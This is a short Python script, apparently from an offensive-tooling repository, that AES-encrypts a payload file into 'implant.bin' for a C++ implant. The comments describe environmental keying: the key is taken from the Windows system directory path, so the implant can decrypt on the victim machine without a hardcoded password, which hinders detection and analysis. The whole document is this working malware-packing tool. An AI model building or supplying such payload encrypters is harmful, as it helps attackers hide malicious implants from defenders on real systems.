# Code Curtesy => TheD1rkMtr

import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom
import hashlib

def AESencrypt(plaintext, key):
    k = hashlib.sha256(KEY).digest()
    iv = 16 * b'\x00'
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext,key

def dropFile(key, ciphertext):
  with open("implant.bin", "wb") as fc:
    fc.write(ciphertext)

try:
    file = open(sys.argv[1], "rb")
    content = file.read()
except:
    print("Usage: .\\aes.py PAYLOAD_FILE")
    sys.exit()


#KEY = urandom(16)
KEY = b'C:\WINDOWS\SYSTE'

# GetSystemDirectoryA() => C:\WINDOWS\SYSTEM32 (19-3) => C:\WINDOWS\syste (=16 byte key)  => Environmental Keying without Intial Recon Needed (No Hardcoding of passwd)!

# I saw that: 
# 1. In My windows Host: my cpp implant is retrieving: "C:\WINDOWS\system32" via GetSystemDirectoryA()
# 2. But in my Windows VM: my cpp implant is retrieving: "C:\Windows\system32" via GetSystemDirectoryA()

# That's why changed the whole string to Upper case, after retrieving!

ciphertext, key = AESencrypt(content, KEY)

dropFile(KEY,ciphertext)
